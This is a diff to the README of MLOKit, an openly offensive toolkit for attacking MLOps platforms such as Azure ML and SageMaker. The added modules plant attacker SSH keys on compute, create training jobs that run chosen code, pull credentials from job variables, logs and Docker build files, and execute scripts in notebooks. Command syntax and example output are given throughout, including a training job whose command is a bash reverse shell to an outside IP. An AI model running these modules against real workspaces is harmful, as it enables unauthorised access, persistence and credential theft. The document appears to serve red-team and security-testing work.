@@ -2,11 +2,11 @@
 
 ## Description
 
-MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials for the respective MLOps platform. The attack modules supported include reconnaissance, training data theft, model theft, model poisoning, and notebook attacks. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.
+MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials for the respective MLOps platform. The attack modules supported include reconnaissance, training data theft, model theft, model poisoning, notebook attacks, training job attacks, and ML compute attacks. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.
 
 
 ## Release
-* Version 1.2 of MLOKit can be found in Releases
+* Version 1.3 of MLOKit can be found in Releases
 
 ## Table of Contents
 
@@ -31,6 +31,15 @@ MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps plat
   - [Poison Model](#poison-model)
   - [List Notebooks](#list-notebooks)
   - [Add Notebook Trigger](#add-notebook-trigger)
+  - [List Compute](#list-compute) - **NEW**
+  - [List Training Jobs](#list-training-jobs) - **NEW**
+  - [Add SSH Key](#add-ssh-key) - **NEW**
+  - [Create Training Job](#create-training-job) - **NEW**
+  - [Get Training Job Variables](#get-training-job-variables) - **NEW**
+  - [Search Training Job Logs](#search-training-job-logs) - **NEW**
+  - [List Environments](#list-environments) - **NEW**
+  - [Get Environment Configs](#get-environment-configs) - **NEW**
+  - [Execute Code within Notebook Instance](#execute-code-within-notebook-instance) - **NEW**
 - [Detection](#detection)
 - [References](#references)
 
@@ -46,6 +55,7 @@ The below 3rd party libraries are used in this project.
 | AWSSDK.S3  | [https://www.nuget.org/packages/AWSSDK.S3](https://www.nuget.org/packages/AWSSDK.S3)| Apache 2.0 License  |
 | AWSSDK.SageMaker  | [https://www.nuget.org/packages/AWSSDK.SageMaker](https://www.nuget.org/packages/AWSSDK.SageMaker)| Apache 2.0 License  |
 | AWSSDK.Core  | [https://www.nuget.org/packages/awssdk.core/](https://www.nuget.org/packages/awssdk.core/)| Apache 2.0 License  |
+| YamlDotNet  | [https://www.nuget.org/packages/awssdk.core/](https://www.nuget.org/packages/yamldotnet) | MIT License  |
 
 ### Pre-Compiled 
 
@@ -79,7 +89,15 @@ Take the below steps to setup Visual Studio in order to compile the project your
 * **poison-model** - Poison a given ML model
 * **list-notebooks** - List the available notebook instances
 * **add-notebook-trigger** - Add a notebook trigger for code execution
-
+* **list-compute** - List the available ML compute instances
+* **list-training-jobs** - List the training jobs that have run
+* **add-ssh-key** - Add public SSH key to ML compute
+* **create-training-job** - Create an ML training job with code specified
+* **get-training-job-vars** - Get all training jobs that have any variables present (could contain credentials)
+* **search-training-job-logs** - Searching training job logs for a given search string (could contain credentials)
+* **list-environments** - List available environments
+* **get-environment-configs** - Download Docker build files for environments (could contain credentials)
+* **exec-notebook-code** - Execute code within a JupyterLab environment within a notebook instance
 
 
 ## Arguments/Options
@@ -114,6 +132,12 @@ The below arguments are required for all command modules.
 * **/dataset-name:** - Applicable to `palantir` platform only. Only applies to upload-dataset command module.
 * **/notebook-name:** - Applicable to `sagemaker` platform only. Only applies to some command modules.
 * **/script:** - Applicable to `sagemaker` platform only. Only applies to one command module.
+* **/compute-id:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/ssh-key:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/training-job-config:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/job-name:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/search:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/environment-name:** - Applicable to `azureml` platform only. Only applies to some command modules.
 
 
 
@@ -255,8 +279,18 @@ Module  | Azure ML (`azureml`) | BigML (`bigml`) | Vertex AI (`vertexai`) | MLFl
 `download-dataset` | X | X | X | | | X
 `upload-dataset` | | | | | | X
 `poison-model` | X |  |  | | X | 
-`list-notebooks` |  |  |  | | X | 
+`list-notebooks` | X |  |  | | X | 
 `add-notebook-trigger` |  |  |  | | X | 
+`list-compute` | X |  |  | |  | 
+`list-training-jobs` | X |  |  | | X | 
+`add-ssh-key` | X |  |  | |  |
+`create-training-job` | X |  |  | |  |
+`get-training-job-vars` | X |  |  | | X  |
+`search-training-job-logs` | X |  |  | |  |
+`list-environments` | X |  |  | |  |
+`get-environment-config` | X |  |  | |  |
+`exec-notebook-code` | X |  |  | | X  |
+
 
 
 ## Examples
@@ -769,6 +803,10 @@ model.tar.gz
 
 Supply the `list-notebooks` modules, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument.
 
+##### Azure ML
+
+`MLOKit.exe list-notebooks /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`
+
 ##### SageMaker
 
 `MLOKit.exe list-notebooks /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`
@@ -863,6 +901,553 @@ Timestamp:      1/28/2025 12:50:20 PM
 [*] INFO: Sleeping for 2 minutes to allow time for notebook to start
 
 [+] SUCCESS: Successfully started notebook with name: brett-test-notebook
+
+```
+
+### List Compute
+
+#### Use Case
+
+> *List the available compute instances*
+
+#### Syntax
+
+Supply the `list-compute` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+##### Azure ML
+
+`MLOKit.exe list-compute /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe list-compute /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace
+
+==================================================
+Module:         list-compute
+Platform:       azureml
+Timestamp:      9/4/2025 9:09:16 AM
+==================================================
+
+
+[*] INFO: Performing list-compute module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
+----------------------------------------------------------------------------------------------------------------------------------
+          trainingcompute34029 |    Running | 172.191.190.197 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure
+        trainingcompute4211145 |    Running |  172.191.121.17 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure
+
+```
+
+### List Training Jobs
+
+#### Use Case
+
+> *List the training jobs that have run*
+
+#### Syntax
+
+Supply the `list-training-jobs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+If you would like to filter for a specific job name, specify the job name within the `/job-name:` command argument.
+
+##### SageMaker
+
+`MLOKit.exe list-training-jobs /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`
+
+##### Azure ML
+
+`MLOKit.exe list-training-jobs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`
+
+`MLOKit.exe list-training-jobs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:[JOB_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe list-training-jobs /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace
+
+==================================================
+Module:         list-training-jobs
+Platform:       azureml
+Timestamp:      9/4/2025 10:43:06 AM
+==================================================
+
+
+[*] INFO: Performing list-training-jobs module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+                          Name |     Status |                     Experiment |       Compute Target |   Job Type |      Job Output Type |          Environment
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+                 totally-legit |   Canceled |                  totally-legit |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+                salary-train-5 |  Completed |                   salary-exp-5 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+        placid_tent_60pjnh37xw |  Completed |                   salary-exp-4 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+                salary-train-4 |  Completed |                   salary-exp-4 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+                salary-train-3 |  Completed |                   salary-exp-3 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+                salary-train-2 |  Completed |                   salary-exp-2 |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+                  salary-train |     Failed |                     salary-exp |          cpu-cluster |    Command |           uri_folder | environments/salary-env/versions/1
+         kind_guava_06ftffx2s2 |  Completed |       heart-failure-experiment |           Serverless |     AutoML |                      |                 None
+        helpful_leg_n2slbwmckq |  Completed |              salary-experiment |           Serverless |     AutoML |                      |                 None
+          teal_wire_gd269cbrzq |   Canceled |            diabetes-experiment |      compute-azureml |     AutoML |                      |                 None
+
+```
+
+### Add SSH Key
+
+#### Use Case
+
+> *Add SSH public key to ML compute*
+
+#### Syntax
+
+Supply the `add-ssh-key` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. Finally, add the compute target name in the `/compute-id:` argument and the public SSH key in the `/ssh-key:` argument.
+
+##### Azure ML
+
+`MLOKit.exe add-ssh-key /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /ssh-key:"[SSH_KEY]" /compute-id:[COMPUTE_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe add-ssh-key /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /ssh-key:"SSH PUB KEY CONTENTS" /compute-id:trainingcompute4211145
+
+==================================================
+Module:         add-ssh-key
+Platform:       azureml
+Timestamp:      9/4/2025 4:10:33 PM
+==================================================
+
+
+[*] INFO: Performing add-ssh-key module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Listing compute instance where SSH key will be added
+
+                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
+----------------------------------------------------------------------------------------------------------------------------------
+        trainingcompute4211145 |    Stopped |  172.191.121.17 |            azureuser |      50000 | uLZqG6PktE= generated-by-azure
+
+[*] INFO: Adding SSH Key to compute instance
+
+[+] SUCCESS: Successfully added SSH key to compute instance
+
+[*] INFO: Restarting compute instance
+
+[*] INFO: Starting compute instance
+
+[+] SUCCESS: Successfully initiated start request for compute instance
+
+[*] INFO: Sleeping for 3 minutes to allow time for compute instance to restart
+
+                          Name |      State |       Public IP |         SSH Username |   SSH Port |                 Public SSH Key
+----------------------------------------------------------------------------------------------------------------------------------
+        trainingcompute4211145 |    Running |  172.191.121.17 |            azureuser |      50000 | zIRxqr2mKirrl attacker-ssh-key
+
+[+] SUCCESS: Compute instance successfully restarted
+
+```
+
+
+### Create Training Job
+
+#### Use Case
+
+> *Create a training job to execute specified code*
+
+#### Syntax
+
+Supply the `create-training-job` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. Finally, add the path to your config file in the `/training-job-config:` argument.
+
+##### Azure ML
+
+`MLOKit.exe create-training-job /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /training-job-config:[PATH_TO_CONFIG]`
+
+##### Example Azure ML Training Job Config - Serverless Execution
+
+```
+$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
+type: command
+name: [ANYTHING_HERE]
+display_name: [ANYTHING_HERE]
+experiment_name: [ANYTHING_HERE]
+
+command: >-
+  [REVERSE_SHELL]
+environment: [ENVIRONMENT_NAME]
+outputs:
+  model:
+    type: [TYPE]
+
+```
+
+##### Example Azure ML Training Job Config - Non-Serverless Execution (e.g., compute cluster)
+
+```
+$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
+type: command
+name: [ANYTHING_HERE]
+display_name: [ANYTHING_HERE]
+experiment_name: [ANYTHING_HERE]
+
+command: >-
+  [REVERSE_SHELL]
+environment: [ENVIRONMENT_NAME]
+compute: [CPU_CLUSTER_NAME]
+outputs:
+  model:
+    type: [TYPE]
+resources:
+  instance_count: 1
+
+```
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe create-training-job /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /training-job-config:C:\Users\hawk\Downloads\malicious_job.yml
+
+==================================================
+Module:         create-training-job
+Platform:       azureml
+Timestamp:      9/5/2025 1:29:34 PM
+==================================================
+
+
+[*] INFO: Performing create-training-job module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Validating config file supplied exists
+
+[+] SUCCESS: Configuration file supplied exists
+
+[*] INFO: Creating training job
+
+{"properties": {"properties": {}, "tags": {}, "displayName": "MLOKit-HqfmCfim", "experimentName": "MLOKit-HqfmCfim", "isArchived": false, "jobType": "command", "command": "bash -i >& /dev/tcp/3.144.115.1/50111 0>&1", "environmentId": "/subscriptions/47c5aaab-dbda-44ca-802e-00801de4db23/resourceGroups/testazureml/providers/Microsoft.MachineLearningServices/workspaces/Test-Workspace/environments/salary-env/versions/1", "environmentVariables": {}, "inputs": {}, "outputs": {"model": {"jobOutputType": "uri_folder"}}, "resources": {"instanceCount": 1, "properties": {}}}}
+
+[+] SUCCESS:Training job created successfully
+
+```
+
+
+### Get Training Job Variables
+
+#### Use Case
+
+> *Get all training jobs that have any variables present (could contain credentials)*
+
+#### Syntax
+
+Supply the `get-training-job-vars` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+
+##### SageMaker
+
+`MLOKit.exe get-training-job-vars /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`
+
+
+##### Azure ML
+
+`MLOKit.exe get-training-job-vars /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`
+
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe get-training-job-vars /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace
+
+==================================================
+Module:         get-training-job-vars
+Platform:       azureml
+Timestamp:      9/8/2025 10:26:55 AM
+==================================================
+
+
+[*] INFO: Performing get-training-job-vars module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Only displaying training jobs that have job variables present
+
+Training Job Name - c2d0d72b-424a-4e8f-8320-87b2038bb346
+Training Job Variables - {"compute":"testingComputefadsfasf","Environment variables":"{\r\n\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}
+
+Training Job Name - 2b489ff8-16f1-4f61-83ae-9799f3ff2ab3
+Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}
+
+Training Job Name - c64bcfff-a675-4cbd-aa06-772694d9ac46
+Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}
+
+Training Job Name - 31891701-235c-491a-9ba7-583e8c111871
+Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based"}
+
+Training Job Name - 7298f906-523c-4d51-b4bc-276961758be1
+Training Job Variables - {"max_epocs":"10","learning_rate":"0.01","learning_rate_schedule":"time-based","Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}
+
+Training Job Name - b1a4eaa4-675a-486f-ad37-462529e2fd06
+Training Job Variables - {"Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}
+
+Training Job Name - 988e3de6-4236-4505-ab56-bc1d9d8e8666
+Training Job Variables - {"Environment variables":"{\r\n\r\n\"AZURE_TENANT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_ID\": \"ABC123\",\r\n\"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n\r\n}"}
+
+Training Job Name - 2f425769-6979-4174-b713-7836a98fb164
+Training Job Variables - {"Environment variables":"{\r\n\r\n    \"AZURE_TENANT_ID\": \"ABC123\",\r\n    \"AZURE_CLIENT_ID\": \"ABC123\",\r\n    \"AZURE_CLIENT_SECRET\": \"AB.....\"\r\n}"}
+
+```
+
+
+### Search Training Job Logs
+
+#### Use Case
+
+> *Searching training job logs for a given search string (could contain credentials)*
+
+#### Syntax
+
+Supply the `search-training-job-logs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+If you would like to filter for a specific job name, specify the job name within the `/job-name:` command argument. Otherwise, you can do `/job-name:all` to search all training jobs.
+
+
+##### Azure ML
+
+`MLOKit.exe search-training-job-logs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:all`
+
+`MLOKit.exe search-training-job-logs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /job-name:[JOB_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe search-training-job-logs /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /job-name:all /search:"AZURE_CLIENT"
+
+==================================================
+Module:         search-training-job-logs
+Platform:       azureml
+Timestamp:      9/8/2025 3:19:59 PM
+==================================================
+
+
+[*] INFO: Performing search-training-job-logs module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Listing training job where logs will be searched
+
+                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
+---------------------------------------------------------------------------------------------------------------------------------------
+                         MLOKit-sgVURWbi |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore
+
+---------------SNIP---------------
+
+                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
+---------------------------------------------------------------------------------------------------------------------------------------
+                          salary-train-5 |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore
+
+[+] SUCCESS: MATCH on search string of AZURE_CLIENT - Downloading Log File with the match
+
+[ENV] AZURE_CLIENT_SECRET=flasdkjfasl;kfjasdl;fkjsaflk
+
+[*] INFO: std_log.txt written to: C:\source\MLOKit-Updates\MLOKit\bin\Release\MLOKit-mtkQBFmK
+
+
+
+[+] SUCCESS: MATCH on search string of AZURE_CLIENT - Downloading Log File with the match
+
+[ENV] AZURE_CLIENT_ID=123123-123123-123123-123123
+
+[*] INFO: std_log.txt written to: C:\source\MLOKit-Updates\MLOKit\bin\Release\MLOKit-mtkQBFmK
+
+
+
+                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
+---------------------------------------------------------------------------------------------------------------------------------------
+                  placid_tent_60pjnh37xw |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore
+
+                                    Name |     Status |       Compute Target |   Job Type |      Job Output Type |            Datastore
+---------------------------------------------------------------------------------------------------------------------------------------
+                          salary-train-4 |  Completed |          cpu-cluster |    Command |           uri_folder | workspaceartifactstore
+
+---------------SNIP---------------
+
+```
+
+### List Environments
+
+#### Use Case
+
+> *List available environments*
+
+#### Syntax
+
+Supply the `list-environments` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+
+##### Azure ML
+
+`MLOKit.exe list-environments /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe list-environments /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace
+
+==================================================
+Module:         list-environments
+Platform:       azureml
+Timestamp:      9/9/2025 9:35:30 AM
+==================================================
+
+
+[*] INFO: Performing list-environments module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Only listing environments with custom Docker build images
+
+                                              Name |     Docker File Path |                                                                 Docker Build URL
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+                               custom-training-env |           Dockerfile | [URL]
+                      pkg-taxifare-output-model-v1 |           Dockerfile | [URL]
+
+
+```
+
+
+### Get Environment Configs
+
+#### Use Case
+
+> *Download Docker build files for environments (could contain credentials)*
+
+#### Syntax
+
+Supply the `get-environment-configs` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument.
+
+If you would like to filter for a specific environment name, specify the environment name within the `/environment-name:` command argument. Otherwise, you can do `/environment-name:all` to target all environments.
+
+
+##### Azure ML
+
+`MLOKit.exe get-environment-configs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /environment-name:all`
+
+`MLOKit.exe get-environment-configs /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /environment-name:[ENVIRONMENT_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe get-environment-config /platform:azureml /credential:%CRED% /subscription-id:47c5aaab-dbda-44ca-802e-00801de4db23 /region:eastus /resource-group:testazureml /workspace:Test-Workspace /environment-name:"all"
+
+==================================================
+Module:         get-environment-config
+Platform:       azureml
+Timestamp:      9/9/2025 9:21:30 AM
+==================================================
+
+
+[*] INFO: Performing get-environment-config module for azureml
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Only listing environments with custom Docker build images
+
+                                              Name |     Docker File Path |                                                                 Docker Build URL
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+                               custom-training-env |           Dockerfile | [URL]
+
+[+] SUCCESS: Docker build file written to: C:\Temp\custom-training-env-Dockerfile
+
+
+                                              Name |     Docker File Path |                                                                 Docker Build URL
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+                      pkg-taxifare-output-model-v1 |           Dockerfile | [URL]
+
+[+] SUCCESS: Docker build file written to: C:\Temp\pkg-taxifare-output-model-v1-Dockerfile
+
+
+
+```
+
+
+
+### Execute Code within Notebook Instance
+
+#### Use Case
+
+> *Execute code within a JupyterLab environment within a notebook instance*
+
+#### Syntax
+
+Supply the `exec-notebook-code` module, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument and a notebook to target in the `/notebook-name:` argument. Finally, add a path to a script file you would like to execution within the notebook environment cloud compute via the `/script:` command argument.
+
+
+##### Azure ML
+
+For Azure ML, ensure you supply the associated compute ID for a notebook instance with the `/compute-id:` command argument.
+
+`MLOKit.exe exec-notebook-code /platform:azureml /credential:[CREDENTIAL] /subscription-id:[SUBSCRIPTION_ID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /compute-id:[COMPUTE_ID] /script:[PATH_TO_SCRIPT]`
+
+##### SageMaker
+
+`MLOKit.exe exec-notebook-code /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME] /notebook-name:[NOTEBOOK_NAME] /script:[PATH_TO_SCRIPT]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe exec-notebook-code /platform:sagemaker /credential:%CRED% /region:us-east-2 /notebook-name:notebookTestBrett /script:RevShell.py
+
+==================================================
+Module:         exec-notebook-code
+Platform:       sagemaker
+Timestamp:      9/12/2025 11:51:50 AM
+==================================================
+
+
+[*] INFO: Performing exec-notebook-code module for sagemaker
+
+[*] INFO: Checking credentials provided
+
+                               Kernel ID |                    Kernel Name |           State
+-------------------------------------------------------------------------------------------
+    175bac38-aebb-4fcb-893d-0bc79bc58c84 |         conda_tensorflow2_p310 |            idle
+
+[*] INFO: Kernel ID to target: 175bac38-aebb-4fcb-893d-0bc79bc58c84
+
+[*] INFO: Connected to Notebook instance via WebSocket
+
+[*] INFO: Executing script against Notebook instance
+
+
+[*] INFO: Response Status for Execution: ok
+
+[+] SUCCESS: Execution Completed
 
 ```
 
